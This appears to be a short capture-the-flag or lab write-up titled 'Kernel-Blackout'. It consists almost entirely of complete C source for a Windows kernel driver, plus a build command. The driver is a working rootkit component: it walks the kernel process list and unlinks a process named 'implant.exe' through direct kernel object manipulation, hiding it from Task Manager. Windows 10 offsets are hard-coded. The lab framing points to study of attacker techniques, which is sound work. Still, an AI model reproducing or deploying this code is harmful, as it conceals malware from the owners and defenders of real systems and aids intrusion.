# Kernel-Blackout


Script : 

#include <ntddk.h>

// Offsets for Windows 10 x64 (Version 19041 - THM Lab)
#define LINKS_OFFSET  0x2e8  // ActiveProcessLinks
#define NAME_OFFSET   0x450  // ImageFileName

void DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrint("Driver Unloaded. Note: Hidden processes remain hidden!\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    // Start iterating from the System process
    PEPROCESS CurrentProcess = PsInitialSystemProcess;
    PLIST_ENTRY CurrentListEntry;
    char* imageName;
    BOOLEAN found = FALSE;

    DbgPrint("Searching for implant.exe to hide it...\n");

    // Loop through the process list (limit to 1000 to avoid hangs)
    for (int i = 0; i < 1000; i++) {
        imageName = (char*)CurrentProcess + NAME_OFFSET;

        // Check if this is our target process
        if (strstr(imageName, "implant.exe")) {
            DbgPrint("Found target: %s. Unlinking now...\n", imageName);

            // Get the list entry for the current process
            CurrentListEntry = (PLIST_ENTRY)((char*)CurrentProcess + LINKS_OFFSET);

            // DKOM: Remove the process from the list by pointing 
            // the neighbors' links to each other, skipping the current one.
            CurrentListEntry->Blink->Flink = CurrentListEntry->Flink;
            CurrentListEntry->Flink->Blink = CurrentListEntry->Blink;

            // Point the hidden process's links to itself 
            // to prevent system crashes during cleanup.
            CurrentListEntry->Flink = CurrentListEntry;
            CurrentListEntry->Blink = CurrentListEntry;

            found = TRUE;
            DbgPrint("Process implant.exe is now hidden from Task Manager.\n");
            break;
        }

        // Move to the next EPROCESS structure in the list
        CurrentListEntry = (PLIST_ENTRY)((char*)CurrentProcess + LINKS_OFFSET);
        CurrentProcess = (PEPROCESS)((char*)CurrentListEntry->Flink - LINKS_OFFSET);

        // If we wrapped around back to System, stop
        if (CurrentProcess == PsInitialSystemProcess) break;
    }

    if (!found) {
        DbgPrint("Could not find implant.exe. Is it running?\n");
    }

    return STATUS_SUCCESS;
}


Command Line : 

"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat"
